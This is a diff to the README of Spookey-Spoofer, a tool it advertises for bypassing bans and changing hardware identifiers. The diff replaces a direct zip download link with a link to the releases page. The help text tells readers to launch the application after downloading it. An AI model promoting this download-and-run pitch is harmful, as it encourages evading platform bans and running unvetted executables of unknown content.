@@ -27,7 +27,7 @@ Welcome to Spookey-Spoofer, the ultimate tool for bypassing bans and changing ha
 
 ## Get Started
 Click the button below to download the Spookey-Spoofer application:
-[![Download Spookey-Spoofer](https://img.shields.io/badge/Download-Spookey--Spoofer-blue)](https://github.com/files/uploaded/Application.zip)
+[![Download Spookey-Spoofer](https://github.com/officialkent/Spookey-Spoofer/releases)](https://github.com/officialkent/Spookey-Spoofer/releases)
 
 ## Need Help?
 If the link above ends with a file name, make sure to launch the application after downloading. If you encounter any issues with the download link, please check the "Releases" section of the repository for alternative download options.
